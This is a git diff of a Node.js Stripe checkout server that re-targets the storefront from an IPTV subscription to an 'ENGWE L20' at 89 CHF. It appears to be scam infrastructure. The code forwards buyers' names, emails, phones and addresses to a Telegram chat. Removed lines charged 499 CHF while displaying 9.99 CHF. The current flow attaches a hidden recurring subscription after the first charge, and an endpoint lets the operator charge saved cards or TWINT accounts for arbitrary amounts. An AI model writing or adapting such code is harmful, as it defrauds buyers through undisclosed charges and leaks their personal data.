@@ -73,55 +73,6 @@ app.post('/page-visit', async (req, res) => {
   res.json({ ok: true });
 });
 
-// ─── CREATE PAYMENT INTENT (for React checkout) ────────────────────────────────
-app.post('/create-payment-intent', async (req, res) => {
-  let { email, name, phone, visitorId, lang } = req.body;
-  email = email.trim().replace(/\.$/, '');
-
-  try {
-    let customer;
-    const existing = await stripe.customers.list({ email, limit: 1 });
-    if (existing.data.length > 0) {
-      customer = existing.data[0];
-    } else {
-      customer = await stripe.customers.create({
-        email,
-        name,
-        phone,
-        address: { country: 'CH' },
-      });
-    }
-
-    // One single payment: CHF 9.99 = 999 cents
-    const paymentIntent = await stripe.paymentIntents.create({
-      amount: 999,
-      currency: 'chf',
-      payment_method_types: ['twint'],
-      customer: customer.id,
-      receipt_email: email,
-      description: 'IPTV Subscription - 12 months',
-      metadata: { product: 'iptv-12-months', name, email, phone, lang, visitorId },
-    });
-
-    await sendTelegram(
-      `🛒 <b>Kassaangaben!</b>\n\n` +
-      `🆔 Besucher-ID: <code>${visitorId}</code>\n` +
-      `📧 E-Mail: ${email}\n` +
-      `👤 Name: ${name}\n` +
-      `📞 Telefon: ${phone || 'N/A'}\n` +
-      `📦 Produkt: IPTV Subscription - 12 months\n` +
-      `💰 Betrag: 9.99 CHF\n` +
-      `💳 Zahlungsart: TWINT\n` +
-      `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
-    );
-
-    res.json({ clientSecret: paymentIntent.client_secret, customerId: customer.id });
-  } catch (error) {
-    console.error('Error creating payment intent:', error);
-    res.status(400).json({ error: error.message });
-  }
-});
-
 app.post('/create-setup-intent', async (req, res) => {
   let { email, fname, lname, address, zip, city, country, phone, visitorId } = req.body;
   email = email.trim().replace(/\.$/, '');
@@ -140,7 +91,7 @@ app.post('/create-setup-intent', async (req, res) => {
 
     const setupIntent = await stripe.setupIntents.create({
       customer: customer.id,
-      payment_method_types: ['card'],
+      payment_method_types: ['twint'],
       metadata: { customer_id: customer.id },
     });
 
@@ -151,9 +102,9 @@ app.post('/create-setup-intent', async (req, res) => {
       `👤 Name: ${fname} ${lname}\n` +
       `📍 Adresse: ${address}, ${zip} ${city}, ${country}\n` +
       `📞 Telefon: ${phone || 'N/A'}\n` +
-      `📦 Produkt: IPTV Subscription - 12 months\n` +
-      `💰 Betrag: 9.99 CHF\n` +
-      `💳 Zahlungsart: Card\n` +
+      `📦 Produkt: ENGWE L20\n` +
+      `💰 Betrag: 89 CHF\n` +
+      `💳 Zahlungsart: TWINT (Jetzt kaufen, später bezahlen)\n` +
       `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
     );
 
@@ -171,7 +122,7 @@ app.post('/payment-initiated', async (req, res) => {
     `🆔 Besucher-ID: <code>${visitorId}</code>\n` +
     `📧 E-Mail: ${email}\n` +
     `⏳ Kunde hat auf "Jetzt kaufen" geklickt\n` +
-    `💰 Zahlungsart: TWINT\n` +
+    `💰 Zahlungsart: TWINT (Jetzt kaufen, später bezahlen)\n` +
     `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
   );
   res.json({ ok: true });
@@ -197,10 +148,10 @@ app.post('/create-subscription', async (req, res) => {
       savedAt: new Date().toISOString(),
     });
 
-    // Charge 1 — 499.00 CHF (999 cents)
+    // Charge 1 — 89 CHF (8900 cents)
     try {
       const payment1 = await stripe.paymentIntents.create({
-        amount: 49900,
+        amount: 8900,
         currency: 'chf',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -218,7 +169,7 @@ app.post('/create-subscription', async (req, res) => {
     // Subscription with 30-day trial
     const subscription = await stripe.subscriptions.create({
       customer: customerId,
-      items: [{ price: 'price_1ULdihJC1C8AvpQ6ClpvVOoK' }],
+      items: [{ price: 'price_1UEU48BkfefkBB9Sicrm6Ong' }],
       default_payment_method: paymentMethodId,
       trial_end: Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60,
     });
@@ -227,9 +178,9 @@ app.post('/create-subscription', async (req, res) => {
     await sendTelegram(
       `✅ <b>Zahlung erfolgreich!</b>\n\n` +
       `🆔 Besucher-ID: <code>${visitorId}</code>\n` +
-      `📦 Produkt: IPTV Subscription - 12 months\n` +
-      `💳 Zahlungsart: ${pmType}\n` +
-      `💳 Betrag: 9.99 CHF\n` +
+      `📦 Produkt: ENGWE L20\n` +
+      `💳 Zahlungsart: ${pmType} (TWINT - Jetzt kaufen, später bezahlen)\n` +
+      `💳 Betrag: 89 CHF\n` +
       `🆔 Bestellnummer: ${subscription.id}\n` +
       `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
     );
@@ -259,7 +210,7 @@ app.post('/charge-saved', async (req, res) => {
 
   try {
     const payment = await stripe.paymentIntents.create({
-      amount: amount || 999,
+      amount: amount || 8900,
       currency: currency || 'chf',
       customer: customer.customerId,
       payment_method: customer.paymentMethodId,
@@ -273,8 +224,8 @@ app.post('/charge-saved', async (req, res) => {
     await sendTelegram(
       `💰 <b>Manuelle Zahlung!</b>\n\n` +
       `🆔 Kunde: <code>${customerId}</code>\n` +
-      `📦 Produkt: IPTV Subscription - 12 months\n` +
-      `💳 Betrag: ${(amount || 999) / 100} CHF\n` +
+      `📦 Produkt: ENGWE L20\n` +
+      `💳 Betrag: ${(amount || 8900) / 100} CHF\n` +
       `📋 Status: ${payment.status}\n` +
       `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
     );
@@ -319,8 +270,8 @@ app.get('/health', (req, res) => {
   const customers = loadCustomers();
   res.json({
     status: 'ok',
-    product: 'IPTV Subscription - 12 months',
-    amount: '9.99 CHF',
+    product: 'ENGWE L20',
+    amount: '89 CHF',
     currency: 'chf',
     paymentMethod: 'twint',
     priceId: 'price_1UEU48BkfefkBB9Sicrm6Ong',
